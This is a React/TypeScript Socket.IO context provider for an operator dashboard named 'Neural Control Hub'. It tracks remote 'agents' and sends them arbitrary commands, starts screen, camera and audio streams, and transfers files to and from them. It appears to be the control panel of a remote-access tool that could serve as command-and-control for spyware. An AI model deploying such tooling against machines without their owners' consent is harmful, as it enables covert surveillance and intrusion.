import React, { createContext, useContext, useEffect, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';

interface Agent {
  id: string;
  name: string;
  status: 'online' | 'offline';
  platform: string;
  ip: string;
  lastSeen: Date;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
}

interface SocketContextType {
  socket: Socket | null;
  connected: boolean;
  agents: Agent[];
  selectedAgent: string | null;
  setSelectedAgent: (agentId: string | null) => void;
  sendCommand: (agentId: string, command: string) => void;
  startStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  uploadFile: (agentId: string, file: File, destinationPath: string) => void;
  downloadFile: (agentId: string, filename: string) => void;
  commandOutput: string[];
  addCommandOutput: (output: string) => void;
  clearCommandOutput: () => void;
}

const SocketContext = createContext<SocketContextType | null>(null);

export function SocketProvider({ children }: { children?: React.ReactNode }) {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [connected, setConnected] = useState(false);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [commandOutput, setCommandOutput] = useState<string[]>([]);

  const addCommandOutput = useCallback((output: string) => {
    setCommandOutput(prev => [...prev.slice(-99), output]); // Keep last 100 lines
  }, []);

  const clearCommandOutput = useCallback(() => {
    setCommandOutput([]);
  }, []);

  useEffect(() => {
    // Connect to Socket.IO server
    const socketUrl = (import.meta as any)?.env?.VITE_SOCKET_URL || (window as any)?.__SOCKET_URL__ || 'http://localhost:8080';
    const socketInstance = io(socketUrl, {
      transports: ['websocket', 'polling'],
      timeout: 20000,
    });

    setSocket(socketInstance);

    // Connection events
    socketInstance.on('connect', () => {
      setConnected(true);
      console.log('Connected to Neural Control Hub');
      socketInstance.emit('operator_connect');
    });

    socketInstance.on('disconnect', () => {
      setConnected(false);
      console.log('Disconnected from Neural Control Hub');
    });

    // Agent management events
    socketInstance.on('agent_list_update', (agentData: Record<string, any>) => {
      const agentList = Object.entries(agentData).map(([id, data]: [string, any]) => ({
        id,
        name: data.name || `Agent-${id.slice(0, 8)}`,
        status: data.last_seen && new Date().getTime() - new Date(data.last_seen).getTime() < 60000 ? 'online' : 'offline',
        platform: data.platform || 'Unknown',
        ip: data.ip || '127.0.0.1',
        lastSeen: data.last_seen ? new Date(data.last_seen) : new Date(),
        capabilities: data.capabilities || ['screen', 'commands'],
        performance: data.performance || { cpu: 0, memory: 0, network: 0 }
      }));
      setAgents(agentList);
    });

    // Command output events
    socketInstance.on('command_output', (data: { agent_id: string; output: string }) => {
      addCommandOutput(`[${data.agent_id}] ${data.output}`);
    });

    // Streaming events
    socketInstance.on('screen_frame', (data: { agent_id: string; frame: string }) => {
      // Handle screen frame updates
      const event = new CustomEvent('screen_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('camera_frame', (data: { agent_id: string; frame: string }) => {
      // Handle camera frame updates
      const event = new CustomEvent('camera_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('audio_frame', (data: { agent_id: string; frame: string }) => {
      // Handle audio frame updates
      const event = new CustomEvent('audio_frame', { detail: data });
      window.dispatchEvent(event);
    });

    // File transfer events
    socketInstance.on('file_download_chunk', (data: any) => {
      const event = new CustomEvent('file_download_chunk', { detail: data });
      window.dispatchEvent(event);
    });

    // WebRTC events
    socketInstance.on('webrtc_stats', (data: any) => {
      console.log('WebRTC Stats:', data);
    });

    socketInstance.on('webrtc_error', (data: { message: string }) => {
      console.error('WebRTC Error:', data.message);
      addCommandOutput(`WebRTC Error: ${data.message}`);
    });

    return () => {
      socketInstance.disconnect();
    };
  }, [addCommandOutput]);

  const sendCommand = useCallback((agentId: string, command: string) => {
    if (socket && connected) {
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`> ${command}`);
    }
  }, [socket, connected, addCommandOutput]);

  const startStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'start-stream';
          break;
        case 'camera':
          command = 'start-camera';
          break;
        case 'audio':
          command = 'start-audio';
          break;
      }
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Starting ${type} stream for ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const stopStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'stop-stream';
          break;
        case 'camera':
          command = 'stop-camera';
          break;
        case 'audio':
          command = 'stop-audio';
          break;
      }
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Stopping ${type} stream for ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
    if (socket && connected) {
      const reader = new FileReader();
      reader.onload = () => {
        const base64Data = reader.result as string;
        // Split file into chunks for large files
        const chunkSize = 1024 * 512; // 512KB chunks
        const chunks = Math.ceil(base64Data.length / chunkSize);
        
        for (let i = 0; i < chunks; i++) {
          const start = i * chunkSize;
          const end = start + chunkSize;
          const chunk = base64Data.slice(start, end);
          
          socket.emit('upload_file_chunk', {
            agent_id: agentId,
            filename: file.name,
            data: chunk,
            offset: start,
            destination_path: destinationPath
          });
        }
        
        socket.emit('upload_file_end', {
          agent_id: agentId,
          filename: file.name,
          destination_path: destinationPath
        });
        
        addCommandOutput(`Uploading ${file.name} to ${agentId}:${destinationPath}`);
      };
      reader.readAsDataURL(file);
    }
  }, [socket, connected, addCommandOutput]);

  const downloadFile = useCallback((agentId: string, filename: string) => {
    if (socket && connected) {
      socket.emit('download_file', {
        agent_id: agentId,
        filename: filename
      });
      addCommandOutput(`Downloading ${filename} from ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const value: SocketContextType = {
    socket,
    connected,
    agents,
    selectedAgent,
    setSelectedAgent,
    sendCommand,
    startStream,
    stopStream,
    uploadFile,
    downloadFile,
    commandOutput,
    addCommandOutput,
    clearCommandOutput,
  };

  return (
    <SocketContext.Provider value={value}>
      {children}
    </SocketContext.Provider>
  );
}

export function useSocket() {
  const context = useContext(SocketContext);
  if (!context) {
    throw new Error('useSocket must be used within a SocketProvider');
  }
  return context;
}